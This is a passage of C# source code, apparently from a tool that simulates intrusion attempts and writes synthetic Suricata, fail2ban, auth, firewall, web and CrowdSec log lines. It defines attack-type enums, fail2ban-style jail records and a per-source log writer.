    private static int Port(Random rng) => rng.Next(32768, 61000);

    private static Jail? JailOf(Service s) => s switch
    {
        Service.Ssh => Sshd,
        Service.WebAuth => HttpAuth,
        Service.WebScan => BotSearch,
        Service.WebFlood => LimitReq,
        _ => null,
    };

    private enum Service { Ssh, WebAuth, WebScan, WebFlood, WebExploit }

    private sealed record Attempt(DateTime At, string Ip, Service Service, string? User, int Port, bool Success = false, string? Method = null,
        string? Path = null, int? Status = null, string? Agent = null, string? Rule = null);

    private sealed record Probe(DateTime At, string Ip, int Port, string Proto);

    private sealed record Jail(string Name, int MaxRetry, TimeSpan FindTime, TimeSpan BanTime);

    private sealed class Lines
    {
        private readonly List<(DateTime At, string Line)> _lines = [];

        public void Add(DateTime at, string line) => _lines.Add((at, line));

        public IReadOnlyList<string> Sorted() => _lines.OrderBy(l => l.At).Select(l => l.Line).ToList();
    }

    private sealed class Writer(TimeZoneInfo zone, DateTime day)
    {
        public TimeZoneInfo Zone { get; } = zone;
        public DateTime Day { get; } = day;
        public Lines Suricata { get; } = new();
        public Lines Fail2ban { get; } = new();
        public Lines Auth { get; } = new();
        public Lines Firewall { get; } = new();
        public Lines Web { get; } = new();
        public Lines Crowdsec { get; } = new();
        public List<(DateTime At, string Ip)> Bans { get; } = [];
    }
}

internal static class DateTimeExtensions
{
    public static int DayNumber(this DateTime d) => DateOnly.FromDateTime(d).DayNumber;
}
